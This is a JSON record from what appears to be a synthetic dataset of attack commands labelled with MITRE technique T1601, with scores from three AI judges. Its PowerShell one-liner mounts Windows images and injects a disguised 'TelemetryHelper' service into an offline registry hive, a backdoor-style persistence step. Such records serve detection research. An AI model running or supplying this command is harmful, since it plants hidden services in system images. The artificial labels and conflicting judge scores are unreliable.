{
  "technique_id": "T1601",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; reg load HKLM\\BASESYS C:\\Mount\\Base\\Windows\\System32\\Config\\SYSTEM >$null; reg load HKLM\\OFFSYS C:\\Mount\\Win\\Windows\\System32\\Config\\SYSTEM >$null; New-Item -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Force | Out-Null; New-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Name \"ImagePath\" -Value \"\\SystemRoot\\System32\\svchost.exe -k netsvcs -s TelemetryHelper\" -PropertyType ExpandString -Force | Out-Null; $b=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\BASESYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); $m=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); Compare-Object $b $m",
  "explanation": "Creates a new service entry in the offline SYSTEM hive of the image and compares the list of services with the clean baseline to validate the injected service.",
  "rationale_steps": [
    "Mount images and load SYSTEM hives (Admin).",
    "Create a new service in the modified image's registry.",
    "Enumerate and Compare-Object the service names between baseline and modified."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1601-f5c24626-7e94b93b",
  "source_prompt_hash": "f5c24626",
  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid flags, correct command separators, and proper registry path references.",
        "semantic_score": 5,
        "semantic_justification": "The command precisely implements the T1601 technique by mounting two Windows images, modifying the system registry of one to add a backdoor service, and comparing it with a clean baseline to validate the modification.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T20:03:13.897231Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct syntax for DISM, `reg` commands, and PowerShell cmdlets, with proper quoting, command separators, and pipeline usage.",
        "semantic_score": 1,
        "semantic_justification": "The command cannot achieve its stated intent of modifying a system image and registering a service as both DISM image mounting and `reg load` operations fundamentally require Administrator privileges, directly contradicting the claimed 'Privilege: None' and rendering it inoperable.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T20:03:38.512279Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed PowerShell one-liner with balanced quotes, valid DISM/reg/cmdlet syntax, proper semicolon separators, and correct registry provider paths.",
        "semantic_score": 4,
        "semantic_justification": "It mounts WIMs, loads offline SYSTEM hives, injects a new service key, and compares against a clean baseline (aligned with T1601), but lacks commit/unload steps and requires administrative privileges and additional service parameters for a fully functional service.",
        "combined_score": 4.5,
        "confidence": 0.84,
        "timestamp": "2025-10-02T20:05:07.010886Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}